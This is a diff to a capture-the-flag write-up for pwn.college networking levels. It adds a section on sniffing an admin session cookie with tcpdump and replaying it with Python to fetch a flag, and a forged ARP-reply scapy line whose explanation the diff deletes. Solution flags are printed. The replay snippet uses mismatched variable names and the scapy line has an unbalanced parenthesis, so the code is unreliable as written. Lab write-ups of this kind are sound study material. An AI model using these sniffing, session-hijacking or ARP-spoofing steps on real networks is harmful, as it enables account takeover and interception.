@@ -477,6 +477,111 @@ Flag captured: pwn.college{I4fIyKwkQexXwA6EYgWabI6ocRG.dRjNzMDL4ITM0EzW}
 
 ## Sniffing Cookies
 
+### Source code
+```py title="/challenge/run" showLineNumbers
+#!/usr/bin/exec-suid --real -- /usr/bin/python -I
+
+import requests
+import random
+import psutil
+import string
+import flask
+import time
+import sys
+import os
+
+from dojjail import Host, Network
+
+flag = open("/flag").read()
+parent_process = psutil.Process(os.getppid())
+admin_pw = "".join(random.sample(string.ascii_letters*10, 8))
+
+def ensure_new_file_fd(path, flags):
+    return os.open(path, os.O_CREAT|os.O_EXCL|os.O_WRONLY)
+
+class ClientHost(Host):
+    def entrypoint(self):
+        sys.stderr = open("/tmp/client-stderr", "w", opener=ensure_new_file_fd)
+
+        time.sleep(2)
+        s = requests.Session()
+        assert s.post("http://10.0.0.2/login", data={"username":"admin", "password":admin_pw}).status_code == 200
+        while True:
+            try:
+                s.get("http://10.0.0.2/ping")
+                time.sleep(1)
+            except (OSError, ConnectionError, TimeoutError, RequestException):
+                continue
+
+class ServerHost(Host):
+    def entrypoint(self):
+        sys.stderr = open("/tmp/server-output", "w", opener=ensure_new_file_fd)
+        sys.stdout = sys.stderr
+
+        app = flask.Flask("server")
+
+        @app.route("/login", methods=["POST"])
+        def login():
+            username = flask.request.form.get("username")
+            password = flask.request.form.get("password")
+            if username == "admin" and password == admin_pw:
+                flask.session["user"] = "admin"
+                return "OK"
+            flask.abort(403, "NOPE")
+
+        @app.route("/ping", methods=["GET"])
+        def ping():
+            return "pong"
+
+        @app.route("/flag", methods=["GET"])
+        def get_flag():
+            if flask.session.get("user", None) != "admin":
+                flask.abort(403, "NOPE")
+            return flag
+
+        app.secret_key = os.urandom(8)
+        app.run("0.0.0.0", 80)
+
+client_host = ClientHost("ip-10-0-0-1", privileged_uid=parent_process.uids().effective)
+server_host = ServerHost("ip-10-0-0-2")
+network = Network(hosts={ client_host: "10.0.0.1", server_host: "10.0.0.2" }, subnet="10.0.0.0/24")
+network.run()
+
+client_host.interactive(environ=parent_process.environ())
+```
+
+The `admin` logs in on `10.0.0.1` and gets a session cookie.
+This cookie is then used to access the flag from the `/flag` endpoint on `10.0.0.2`.
+
+Let's sniff the cookie.
+
+```
+root@ip-10-0-0-1:/# tcpdump -i any -A 'tcp port 80' | grep --color=always -E 'Cookie:|Set-Cookie:'
+-bash: child setpgid (18 to 2439): Operation not permitted
+tcpdump: WARNING: any: That device doesn't support promiscuous mode
+(Promiscuous mode not supported on the "any" device)
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
+Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aFBJpg.Y9xBw6F8lRXYZomiDVkLwwHHp6k
+
+# --- snip ---
+```
+
+Now we can use teh cookie to get the flag from `http://10.0.0.2/flag`.
+
+```py
+In [1]: import requests
+   ...: 
+   ...: cookies = {
+   ...:     "session": "eyJ1c2VyIjoiYWRtaW4ifQ.aFBJpg.Y9xBw6F8lRXYZomiDVkLwwHHp6k"
+   ...: }
+   ...: 
+   ...: responnse = requests.get("http://10.0.0.2/flag", cookies = cookies)
+   ...: print(response.text)
+   ...: 
+pwn.college{s_X0-uEuI4QDPvCeidQDJnjs1ke.QXxQDM2EDL4ITM0EzW}
+```
+
 &nbsp;
 
 ## Network Configuration
@@ -1871,9 +1976,12 @@ network.run()
 user_host.interactive(environ=parent_process.environ())
 ```
 
-In this level we have to achieve the same goal as level 7. However, we don't have the ability to add addresses as we are not the net admin.
 
-Therefore we will have to create an ARP packet from scratch and send it to the host on 10.0.0.4.
+
+
+```
+sendp(Ether(src="1e:a8:ee:bd:f7:d4", dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc="10.0.0.3", hwsrc="1e:a8:ee:bd:f7:d4", pdst="10.0.0.2", hwdst="ff:ff:ff:ff:ff:ff")), iface="eth0")
+```
 
 &nbsp;
 
